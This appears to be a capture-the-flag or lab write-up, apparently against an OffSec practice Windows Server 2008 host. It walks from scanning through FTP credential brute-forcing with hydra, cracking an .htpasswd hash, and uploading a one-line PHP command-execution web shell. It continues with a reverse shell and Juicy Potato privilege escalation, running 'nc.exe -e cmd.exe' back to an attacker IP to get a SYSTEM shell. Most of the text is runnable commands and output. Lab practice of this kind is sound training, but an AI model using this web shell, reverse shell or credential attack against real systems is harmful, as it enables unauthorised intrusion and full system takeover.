```sh
Nmap scan report for 192.168.127.46
Host is up, received user-set (0.022s latency).
Scanned at 2026-01-23 11:47:34 CET for 139s
Not shown: 65531 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE       REASON          VERSION
21/tcp   open  ftp           syn-ack ttl 125 zFTPServer 6.0 build 2011-10-17
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| total 9680
| ----------   1 root     root      5610496 Oct 18  2011 zFTPServer.exe
| ----------   1 root     root           25 Feb 10  2011 UninstallService.bat
| ----------   1 root     root      4284928 Oct 18  2011 Uninstall.exe
| ----------   1 root     root           17 Aug 13  2011 StopService.bat
| ----------   1 root     root           18 Aug 13  2011 StartService.bat
| ----------   1 root     root         8736 Nov 09  2011 Settings.ini
| dr-xr-xr-x   1 root     root          512 Jan 23 17:58 log
| ----------   1 root     root         2275 Aug 09  2011 LICENSE.htm
| ----------   1 root     root           23 Feb 10  2011 InstallService.bat
| dr-xr-xr-x   1 root     root          512 Nov 08  2011 extensions
| dr-xr-xr-x   1 root     root          512 Nov 08  2011 certificates
|_dr-xr-xr-x   1 root     root          512 Aug 03  2024 accounts
242/tcp  open  http          syn-ack ttl 125 Apache httpd 2.2.21 ((Win32) PHP/5.3.8)
|_http-server-header: Apache/2.2.21 (Win32) PHP/5.3.8
| http-auth: 
| HTTP/1.1 401 Authorization Required\x0D
|_  Basic realm=Qui e nuce nuculeum esse volt, frangit nucem!
|_http-title: 401 Authorization Required
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
3145/tcp open  zftp-admin    syn-ack ttl 125 zFTPServer admin
3389/tcp open  ms-wbt-server syn-ack ttl 125 Microsoft Terminal Service
|_ssl-date: 2026-01-23T10:49:51+00:00; -2s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: LIVDA
|   NetBIOS_Domain_Name: LIVDA
|   NetBIOS_Computer_Name: LIVDA
|   DNS_Domain_Name: LIVDA
|   DNS_Computer_Name: LIVDA
|   Product_Version: 6.0.6001
|_  System_Time: 2026-01-23T10:49:47+00:00
| ssl-cert: Subject: commonName=LIVDA
| Issuer: commonName=LIVDA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-08-01T20:34:50
| Not valid after:  2025-01-31T20:34:50
| MD5:     cb43 ebe5 52b7 54aa 95ad b389 f735 4b8d
| SHA-1:   3f97 f288 33b1 f10b ed21 ba3c 1b74 ae86 f20c bcfe
| SHA-256: 85c6 6791 1492 dd6f 7781 5723 c98b 1f90 ec7f df04 1571 6cc9 2027 0bdd 3bd2 204d
| -----BEGIN CERTIFICATE-----
| MIICzjCCAbagAwIBAgIQYzH4DigU5LlJ0l1XhSd4/zANBgkqhkiG9w0BAQUFADAQ
| MQ4wDAYDVQQDEwVMSVZEQTAeFw0yNDA4MDEyMDM0NTBaFw0yNTAxMzEyMDM0NTBa
| MBAxDjAMBgNVBAMTBUxJVkRBMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKC
| AQEAnUKvv3Eh7QgszN1DM1bLi0lyiU9GBRkInuuExCYWXkusF/PLEvMIwlwH2SsM
| 34OmuduqDSkB7UtKNRQZcArmWgEeMEV8UXLlsQXLGdxrQtsD2w15p08mwR3wLW3Q
| IIJ5qrGf/sn0LAXCBepLfGb+46TmYYkHF6R6xl2t0wL4d+Z8Do1CIkAYyKLSOU9L
| dZTEAYIvf/38/NKi4161X3yR9GIWMb7Gnx+ukkbj+HK2zIK5xi7fDmPeoC0F+ldn
| olizS0C2UJ5ZSRI5pNKkDt+o3if7ApYZb/H44xie2xPOkhscN3FUZPtYtfUP+Pdq
| usHYgCqDJpRVmICzFrZgQSOx6QIDAQABoyQwIjATBgNVHSUEDDAKBggrBgEFBQcD
| ATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQEFBQADggEBAFp9g2iZoXTkZJFlUiao
| iJMxZICiBtMbLdXe6OBnuY3mGqcK0WgdjRRLv9fASkJlhnKh9xpABeDkMQ6AeTJJ
| lErRJoET9yB30XtCPJ+1HsPdIoga28DDCAeUUOXf3I9yvlLfhT+22m9T+82VnVK9
| gCiUs4cYHDZSbvPs6vnnzeM3qi6O4R37jrKQNacK+Y1okXbOMFyWof71r3PPXrCq
| PYhZFBWWoNntRPuACG7CKGG+3I9VSCFiir3X76VAj0b+9hg5w0CX+qid4N+Ijum5
| rOzxLYVqy/GQ04WfGkQX5q/si0hpjS5RwtwpqBLad1Ffv1nYk4YS9WpTzI6w8v9R
| Jcs=
|_-----END CERTIFICATE-----
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -2s

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:49
Completed NSE at 11:49, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:49
Completed NSE at 11:49, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:49
Completed NSE at 11:49, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 139.47 seconds
           Raw packets sent: 131154 (5.771MB) | Rcvd: 91 (4.004KB)
```

Found loads of files, but can't download any of them...

Found  zFTPServer 6.0, a quick google reveals this exploit:
https://www.exploit-db.com/exploits/18235

```sh
perl exploit.pl 192.168.127.46 6 

        #######################################################
        # This PoC-Exploit is only for educational purpose!!! #
        #######################################################

[+] Connected to 192.168.127.46
[+] Logged in with user anonymous
[+] Building payload
[+] Sending payload ....//
rmdir failed Access denied
```

No luck!

http://192.168.127.46:242/ requires login, tried offsec:offsec but that gives an error.

Tried hydra, found admin, admin:
```
hydra -C /usr/share/wordlists/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://192.168.127.46 -V
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-01-23 11:57:29
[DATA] max 16 tasks per 1 server, overall 16 tasks, 66 login tries, ~5 tries per task
[DATA] attacking ftp://192.168.127.46:21/
[ATTEMPT] target 192.168.127.46 - login "anonymous" - pass "anonymous" - 1 of 66 [child 0] (0/0)
[ATTEMPT] target 192.168.127.46 - login "root" - pass "rootpasswd" - 2 of 66 [child 1] (0/0)
[ATTEMPT] target 192.168.127.46 - login "root" - pass "12hrs37" - 3 of 66 [child 2] (0/0)
[ATTEMPT] target 192.168.127.46 - login "ftp" - pass "b1uRR3" - 4 of 66 [child 3] (0/0)
[ATTEMPT] target 192.168.127.46 - login "admin" - pass "admin" - 5 of 66 [child 4] (0/0)
[ATTEMPT] target 192.168.127.46 - login "localadmin" - pass "localadmin" - 6 of 66 [child 5] (0/0)
[ATTEMPT] target 192.168.127.46 - login "admin" - pass "1234" - 7 of 66 [child 6] (0/0)
[ATTEMPT] target 192.168.127.46 - login "apc" - pass "apc" - 8 of 66 [child 7] (0/0)
[ATTEMPT] target 192.168.127.46 - login "admin" - pass "nas" - 9 of 66 [child 8] (0/0)
[ATTEMPT] target 192.168.127.46 - login "Root" - pass "wago" - 10 of 66 [child 9] (0/0)
[ATTEMPT] target 192.168.127.46 - login "Admin" - pass "wago" - 11 of 66 [child 10] (0/0)
[ATTEMPT] target 192.168.127.46 - login "User" - pass "user" - 12 of 66 [child 11] (0/0)
[ATTEMPT] target 192.168.127.46 - login "Guest" - pass "guest" - 13 of 66 [child 12] (0/0)
[ATTEMPT] target 192.168.127.46 - login "ftp" - pass "ftp" - 14 of 66 [child 13] (0/0)
[ATTEMPT] target 192.168.127.46 - login "admin" - pass "password" - 15 of 66 [child 14] (0/0)
[ATTEMPT] target 192.168.127.46 - login "a" - pass "avery" - 16 of 66 [child 15] (0/0)
[21][ftp] host: 192.168.127.46   login: anonymous   password: anonymous
[ATTEMPT] target 192.168.127.46 - login "admin" - pass "123456" - 17 of 66 [child 0] (0/0)
[21][ftp] host: 192.168.127.46   login: admin   password: admin
[ATTEMPT] target 192.168.127.46 - login "adtec" - pass "none" - 18 of 66 [child 4] (0/0)
[ATTEMPT] target 192.168.127.46 - login "none" - pass "dpstelecom" - 20 of 66 [child 1] (0/0)
[ATTEMPT] target 192.168.127.46 - login "instrument" - pass "instrument" - 21 of 66 [child 5] (0/0)
[ATTEMPT] target 192.168.127.46 - login "user" - pass "password" - 22 of 66 [child 8] (0/0)
[ATTEMPT] target 192.168.127.46 - login "root" - pass "password" - 23 of 66 [child 10] (0/0)
[ATTEMPT] target 192.168.127.46 - login "default" - pass "default" - 24 of 66 [child 12] (0/0)
[ATTEMPT] target 192.168.127.46 - login "nmt" - pass "1234" - 26 of 66 [child 13] (0/0)
[ATTEMPT] target 192.168.127.46 - login "supervisor" - pass "supervisor" - 28 of 66 [child 2] (0/0)
[ATTEMPT] target 192.168.127.46 - login "user1" - pass "pass1" - 29 of 66 [child 3] (0/0)
[ATTEMPT] target 192.168.127.46 - login "avery" - pass "avery" - 30 of 66 [child 6] (0/0)
[ATTEMPT] target 192.168.127.46 - login "IEIeMerge" - pass "eMerge" - 31 of 66 [child 7] (0/0)
[ATTEMPT] target 192.168.127.46 - login "ADMIN" - pass "12345" - 32 of 66 [child 9] (0/0)
[ATTEMPT] target 192.168.127.46 - login "beijer" - pass "beijer" - 33 of 66 [child 11] (0/0)
[ATTEMPT] target 192.168.127.46 - login "Admin" - pass "admin" - 34 of 66 [child 14] (0/0)
[ATTEMPT] target 192.168.127.46 - login "root" - pass "admin" - 37 of 66 [child 15] (0/0)
[21][ftp] host: 192.168.127.46   login: Admin   password: admin
[ATTEMPT] target 192.168.127.46 - login "se" - pass "1234" - 38 of 66 [child 14] (0/0)
[ATTEMPT] target 192.168.127.46 - login "device" - pass "apc" - 40 of 66 [child 0] (0/0)
[ATTEMPT] target 192.168.127.46 - login "apc" - pass "apc" - 41 of 66 [child 4] (0/0)
[ATTEMPT] target 192.168.127.46 - login "dm" - pass "ftp" - 42 of 66 [child 1] (0/0)
[ATTEMPT] target 192.168.127.46 - login "dmftp" - pass "ftp" - 43 of 66 [child 8] (0/0)
[ATTEMPT] target 192.168.127.46 - login "httpadmin" - pass "fhttpadmin" - 44 of 66 [child 10] (0/0)
[ATTEMPT] target 192.168.127.46 - login "user" - pass "system" - 45 of 66 [child 12] (0/0)
[ATTEMPT] target 192.168.127.46 - login "MELSEC" - pass "MELSEC" - 46 of 66 [child 13] (0/0)
[ATTEMPT] target 192.168.127.46 - login "QNUDECPU" - pass "QNUDECPU" - 47 of 66 [child 5] (0/0)
[ATTEMPT] target 192.168.127.46 - login "ftp_boot" - pass "ftp_boot" - 48 of 66 [child 2] (0/0)
[ATTEMPT] target 192.168.127.46 - login "uploader" - pass "ZYPCOM" - 49 of 66 [child 3] (0/0)
[ATTEMPT] target 192.168.127.46 - login "ftpuser" - pass "password" - 50 of 66 [child 6] (0/0)
[ATTEMPT] target 192.168.127.46 - login "USER" - pass "USER" - 51 of 66 [child 7] (0/0)
[ATTEMPT] target 192.168.127.46 - login "qbf77101" - pass "hexakisoctahedron" - 52 of 66 [child 9] (0/0)
[ATTEMPT] target 192.168.127.46 - login "ntpupdate" - pass "ntpupdate" - 53 of 66 [child 11] (0/0)
[ATTEMPT] target 192.168.127.46 - login "sysdiag" - pass "factorycast@schneider" - 54 of 66 [child 15] (0/0)
[ATTEMPT] target 192.168.127.46 - login "wsupgrade" - pass "wsupgrade" - 55 of 66 [child 0] (0/0)
[ATTEMPT] target 192.168.127.46 - login "pcfactory" - pass "pcfactory" - 56 of 66 [child 14] (0/0)
[ATTEMPT] target 192.168.127.46 - login "loader" - pass "fwdownload" - 57 of 66 [child 4] (0/0)
[ATTEMPT] target 192.168.127.46 - login "test" - pass "testingpw" - 58 of 66 [child 12] (0/0)
[ATTEMPT] target 192.168.127.46 - login "webserver" - pass "webpages" - 59 of 66 [child 1] (0/0)
[ATTEMPT] target 192.168.127.46 - login "fdrusers" - pass "sresurdf" - 60 of 66 [child 8] (0/0)
[ATTEMPT] target 192.168.127.46 - login "nic2212" - pass "poiuypoiuy" - 61 of 66 [child 10] (0/0)
[ATTEMPT] target 192.168.127.46 - login "user" - pass "user00" - 62 of 66 [child 13] (0/0)
[ATTEMPT] target 192.168.127.46 - login "su" - pass "ko2003wa" - 63 of 66 [child 2] (0/0)
[ATTEMPT] target 192.168.127.46 - login "MayGion" - pass "maygion.com" - 64 of 66 [child 3] (0/0)
[ATTEMPT] target 192.168.127.46 - login "PlcmSpIp" - pass "PlcmSpIp" - 66 of 66 [child 5] (0/0)
1 of 1 target successfully completed, 3 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-01-23 11:57:33

```

Logging with admin reveals different files:
![[Pasted image 20260123115931.png]]

.htpassword contains:
```sh
offsec:$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0
```

index,php contains:
```sh
<center><pre>Qui e nuce nuculeum esse volt, frangit nucem!</pre></center>
```

john found password 
```sh
john hash.txt             
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 8 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
Proceeding with incremental:ASCII
elite            (offsec)     
1g 0:00:00:24 DONE 3/3 (2026-01-23 12:00) 0.04022g/s 218458p/s 218458c/s 218458C/s ghifs..elikk
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

Logging into reveals the contents of index.php as expected:
![[Pasted image 20260123120609.png]]

Can't edit index.php, but I can add my own files, but I can't edit them, but I can upload them:

 Uploaded cmd2.php:
```php
<?php exec($_GET['cmd']);?>
```

That works!:
![[Pasted image 20260123121103.png]]

After trying a whole bunch of options, only "Ivan Sincek" revshell works on port 135??!:
```
rlwrap nc -lvnp 135
Listening on 0.0.0.0 135
Connection received on 192.168.127.46 49164
SOCKET: Shell has connected! PID: 3176
Microsoft Windows [Version 6.0.6001]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\wamp\bin\apache\Apache2.2.21>
```

We're apache and whoami /priv shows we have 'SeImpersonatePrivilege':
```sh
C:\wamp\bin\apache\Apache2.2.21>whoami
livda\apache

C:\wamp\bin\apache\Apache2.2.21>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

JuicyPotato.exe doesn't work:
```sh
C:\wamp\www>.\JuicyPotato.exe
This version of C:\wamp\www\JuicyPotato.exe is not compatible with the version of Windows you're running. Check your computer's system information to see whether you need a x86 (32-bit) or x64 (64-bit) version of the program, and then contact the software publisher.

```

```
C:\wamp\www>systeminfo

Host Name:                 LIVDA
OS Name:                   Microsoftr Windows Serverr 2008 Standard 
OS Version:                6.0.6001 Service Pack 1 Build 6001
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                92573-OEM-7502905-27565
Original Install Date:     12/19/2009, 11:25:57 AM
System Boot Time:          1/23/2026, 1:52:47 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2650 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 11/12/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (GMT-08:00) Pacific Time (US & Canada)
Total Physical Memory:     2,047 MB
Available Physical Memory: 1,641 MB
Page File: Max Size:       1,985 MB
Page File: Available:      1,525 MB
Page File: In Use:         460 MB
Page File Location(s):     N/A
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           N/A

```

Downloaded:
https://github.com/ivanitlearning/Juicy-Potato-x86/releases/download/1.2/Juicy.Potato.x86.exe

```sh
.\Juicy.Potato.x86.exe -l 1360 -p c:\windows\system32\cmd.exe -a "/c C:\wamp\www\nc.exe -e cmd.exe 192.168.45.190 4444" -t * -c  {6d18ad12-bde3-4393-b311-099c346e6df9} 
```

Got shell as "nt authority\system"
```
rlwrap nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 192.168.127.46 49267
Microsoft Windows [Version 6.0.6001]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```